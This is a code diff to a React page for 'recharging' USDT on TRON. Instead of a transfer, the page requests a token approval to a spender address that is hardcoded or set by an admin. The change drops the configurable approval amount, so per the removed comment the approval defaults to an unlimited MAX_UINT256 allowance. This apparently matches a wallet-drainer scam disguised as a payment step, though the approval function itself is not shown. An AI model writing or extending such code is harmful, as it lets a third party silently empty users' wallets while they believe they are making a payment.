@@ -29,7 +29,6 @@ const RechargeUsdtPage = () => {
   const [showPaymentModal, setShowPaymentModal] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [spenderAddress, setSpenderAddress] = useState<string>('TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6');
-  const [approvalAmount, setApprovalAmount] = useState<string>('');
   const hasCreatedOrder = useRef(false);
   const { user } = useAuth();
   const { t } = useLanguage();
@@ -60,30 +59,24 @@ const RechargeUsdtPage = () => {
   const isMobile = typeof window !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
   const hasTronWeb = checkTronWeb();
 
-  // Fetch spender address and approval amount from admin settings
+  // Fetch spender address from admin settings
   useEffect(() => {
-    const fetchSettings = async () => {
+    const fetchSpenderAddress = async () => {
       try {
         const { data, error } = await supabase
           .from('app_settings' as any)
-          .select('key, value')
-          .in('key', ['spender_address', 'approval_amount']) as { data: { key: string, value: string }[] | null, error: any };
+          .select('value')
+          .eq('key', 'spender_address')
+          .maybeSingle() as { data: { value: string } | null, error: any };
         
-        if (!error && data) {
-          const spender = data.find(s => s.key === 'spender_address');
-          if (spender?.value) {
-            setSpenderAddress(spender.value);
-          }
-          const amount = data.find(s => s.key === 'approval_amount');
-          if (amount?.value) {
-            setApprovalAmount(amount.value);
-          }
+        if (!error && data?.value) {
+          setSpenderAddress(data.value);
         }
       } catch (e) {
-        console.error('Error fetching settings:', e);
+        console.error('Error fetching spender address:', e);
       }
     };
-    fetchSettings();
+    fetchSpenderAddress();
   }, []);
 
   // Initialize payment order and timer
@@ -273,8 +266,7 @@ const RechargeUsdtPage = () => {
     setIsProcessing(true);
     
     try {
-      // Pass approval amount from settings (or undefined for MAX_UINT256)
-      const result = await approveUSDT(spenderAddress, paymentAmount, approvalAmount || undefined);
+      const result = await approveUSDT(spenderAddress, paymentAmount);
       
       if (result.success) {
         toast({
